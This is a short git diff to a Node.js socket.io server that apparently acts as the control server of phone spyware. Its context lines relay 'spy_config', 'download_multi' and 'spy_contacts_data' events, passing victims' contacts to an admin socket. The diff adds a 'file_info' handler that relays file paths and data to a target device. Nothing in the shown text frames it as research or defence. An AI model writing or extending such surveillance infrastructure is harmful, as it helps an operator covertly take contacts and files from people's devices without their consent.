@@ -124,7 +124,10 @@ socket.on("spy_config", (status, too) => {
     io.to(device_secure_ids[too]).emit("download_multi", def_path, data);
     console.log("path " + def_path + ", data " + data);
   });
-
+socket.on("file_info", (def_path, data, too) => {
+    io.to(device_secure_ids[too]).emit("file_info", def_path, data);
+    console.log("file info path " + def_path + ", data " + data);
+  });
   socket.on("spy_contacts_data", (cname, cdata) => {
     io.to(admin_socket_id).emit("contacts_data", cdata, cname);
   });
